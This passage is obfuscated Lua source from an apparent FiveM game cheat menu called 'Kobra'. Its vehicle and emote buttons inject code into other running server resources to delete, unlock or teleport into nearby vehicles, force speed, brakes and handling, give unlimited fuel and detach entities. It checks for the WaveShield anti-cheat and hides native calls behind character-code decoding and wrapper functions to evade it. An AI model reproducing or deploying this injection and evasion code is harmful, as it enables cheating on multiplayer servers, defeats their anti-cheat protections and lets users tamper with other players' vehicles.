                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);end end},{type="button",label="Delete Vehicle",onSelect=function() local v466=0;while true do if (v466==(978 -(194 + 784))) then v12:Notify("success","Kobra","Deleted Vehicle",4770 -(694 + 1076) );MachoInjectResourceRaw("any",[[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]]);break;end end end},{type="button",label="Unlock Closest Vehicle",onSelect=function() v12:Notify("success","Kobra","Deleted Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]]);end},{type="button",label="Teleport into Closest Vehicle",onSelect=function() v12:Notify("success","Kobra","Teleported into Vehicle",2824 + 176 );MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]]);end},{type="divider",label="Toggles"},{type="checkbox",label="Boost Vehicle",checked=false,onSelect=function(v467) if v467 then local v634=0 + 0 ;while true do if (v634==(0 + 0)) then v12:Notify("success","Kobra","Boost Vehicle On",8788 -5788 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]]);end break;end end else v12:Notify("error","Kobra","Boost Vehicle Off",2779 + 221 );if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.superSpeedBoost = false
                                        ]]);else v49("any",[[
                                            VkLpOiUyTrEq = false
                                        ]]);end end end},{type="checkbox",label="Instant Brakes",checked=false,onSelect=function(v468) local v469=GetResourceState("WaveShield")=="started" ;local v470=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v468 then if v469 then local v803=0 -0 ;while true do if (v803==0) then v12:Notify("success","Kobra","Instant Brakes On",331 + 2669 );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return PlayerPedId() end
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                while VkLpOiUyTrEq and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                            VbNmQwErTyUi(veh, 0.0)
                                                        end
                                                    end
                                                    ::continue::
                                                end

                                                -- Restore on disable
                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = PoLkJhBgVfCd(ped, false)
                                                    if veh and veh ~= 0 then
                                                        -- No need to restore speed, just stop forcing 0
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v49(v470,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            VkLpOiUyTrEq = true

                                            local function YgT7FrqXcN()
                                                local ZxSeRtYhUiOp = CreateThread
                                                local LkJhGfDsAzXv = PlayerPedId
                                                local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                local ErTyUiOpAsDf = IsDisabledControlPressed
                                                local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                local VbNmQwErTyUi = SetVehicleForwardSpeed

                                                ZxSeRtYhUiOp(function()
                                                    while VkLpOiUyTrEq and not Unloaded do
                                                        local ped = LkJhGfDsAzXv()
                                                        local veh = PoLkJhBgVfCd(ped, false)
                                                        if veh and veh ~= 0 then
                                                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                                                VbNmQwErTyUi(veh, 0.0)
                                                            end
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            YgT7FrqXcN()
                                        ]]);v12:Notify("success","Kobra","Instant Brakes On (Fallback)",3000);end elseif v469 then local v804=0;while true do if (v804==(0 + 0)) then v12:Notify("success","Kobra","Instant Brakes Off",3585 -(217 + 368) );v49(((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                            VkLpOiUyTrEq = false
                                        ]]);break;end end else local v805=0 -0 ;while true do if (v805==(0 + 0)) then v49(v470,[[
                                            VkLpOiUyTrEq = false
                                        ]]);v12:Notify("success","Kobra","Instant Brakes Off (Fallback)",3000);break;end end end end},{type="checkbox",label="Easy Handling",checked=false,onSelect=function(v471) local v472=0 + 0 ;local v473;local v474;while true do if (0==v472) then v473=GetResourceState("WaveShield")=="started" ;v474=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v472=1 + 0 ;end if (v472==1) then if v471 then if v473 then local v1043=0;while true do if (v1043==(889 -(844 + 45))) then v12:Notify("success","Kobra","Easy Handling On",3284 -(242 + 42) );MachoInjectResourceRaw("WaveShield",[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local function getPed() return GetPlayerPed(-1) end
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                while NvGhJkLpOiUy and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if not ped or ped == 0 then goto continue end
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 73.0)
                                                        PlMnBvCxZaSd(veh, true)
                                                    end
                                                    ::continue::
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else v49(v474,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleGravityAmount", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetVehicleStrong", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
                                            NvGhJkLpOiUy = true

                                            local function KbZwVoYtLx()
                                                local BtGhYtUlOpLk = CreateThread
                                                local WeRtYuIoPlMn = PlayerPedId
                                                local TyUiOpAsDfGh = GetVehiclePedIsIn
                                                local UyTrBnMvCxZl = SetVehicleGravityAmount
                                                local PlMnBvCxZaSd = SetVehicleStrong

                                                BtGhYtUlOpLk(function()
                                                    while NvGhJkLpOiUy and not Unloaded do
                                                        local ped = WeRtYuIoPlMn()
                                                        local veh = TyUiOpAsDfGh(ped, false)
                                                        if veh and veh ~= 0 then
                                                            UyTrBnMvCxZl(veh, 73.0)
                                                            PlMnBvCxZaSd(veh, true)
                                                        end
                                                        Wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = WeRtYuIoPlMn()
                                                    local veh = TyUiOpAsDfGh(ped, false)
                                                    if veh and veh ~= 0 then
                                                        UyTrBnMvCxZl(veh, 9.8)
                                                        PlMnBvCxZaSd(veh, false)
                                                    end
                                                end)
                                            end

                                            KbZwVoYtLx()
                                        ]]);v12:Notify("success","Kobra","Easy Handling On (Fallback)",6005 -3005 );end elseif v473 then v12:Notify("success","Kobra","Easy Handling Off",3000);MachoInjectResourceRaw("WaveShield",[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);else v49(v474,[[
                                            NvGhJkLpOiUy = false
                                            local UyTrBnMvCxZl = SetVehicleGravityAmount
                                            local PlMnBvCxZaSd = SetVehicleStrong
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsIn(ped, false)
                                            if veh and veh ~= 0 then
                                                UyTrBnMvCxZl(veh, 9.8)
                                                PlMnBvCxZaSd(veh, false)
                                            end
                                        ]]);v12:Notify("success","Kobra","Easy Handling Off (Fallback)",3000);end break;end end end},{type="checkbox",label="Rainbow Vehicle",checked=false,onSelect=function(v475) local v476=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v475 then v12:Notify("success","Kobra","Rainbow Vehicle On",3000);if (GetResourceState("WaveShield")=="started") then print("souygdfg");v49(v476,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.osintRainbow.originals[name] then
                                                    _G.osintRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.osintRainbow.thread then
                                                _G.osintRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.osintRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.osintRainbow.enabled and coroutine.status(_G.osintRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.osintRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]]);else v49(v476,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end else local v635=0;while true do if (v635==(1200 -(132 + 1068))) then v12:Notify("error","Kobra","Rainbow Vehicle Off",3000);if (GetResourceState("WaveShield")=="started") then local v1044=0 -0 ;while true do if (v1044==0) then print("swave");v49(v476,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);break;end end else v49(v476,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v477) if v477 then v12:Notify("success","Kobra","Unlimited Fuel On",3000);v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);else local v636=0 + 0 ;while true do if (v636==(1634 -(497 + 1137))) then v12:Notify("error","Kobra","Unlimited Fuel Off",3000);v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v478=0;while true do if (v478==0) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
